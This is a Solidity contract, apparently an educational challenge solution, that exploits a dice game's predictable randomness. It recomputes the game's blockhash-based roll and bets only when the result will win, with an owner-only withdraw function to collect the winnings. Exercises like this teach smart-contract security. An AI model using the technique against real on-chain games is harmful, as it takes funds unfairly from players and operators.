pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        require(address(this).balance > 0, "No winnings to withdraw");
        (bool sent, ) = _addr.call{value: _amount}("");
        require(sent, "Withdrawal failed ~mysteriously~");
    }

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public {
        require(
            address(this).balance >= 0.002 ether,
            "You need more eth to roll them dice"
        );
        bytes32 hash = keccak256(
            abi.encodePacked(
                blockhash(block.number - 1),
                address(diceGame),
                diceGame.nonce()
            )
        );
        uint256 roll = uint256(hash) % 16;
        //console.log("roll %d", roll);

        require(roll <= 2, "That roll was a loser, try again");
        diceGame.rollTheDice{value: 0.002 ether}();
    }

    //Add receive() function so contract can receive Eth
    receive() external payable {}
}
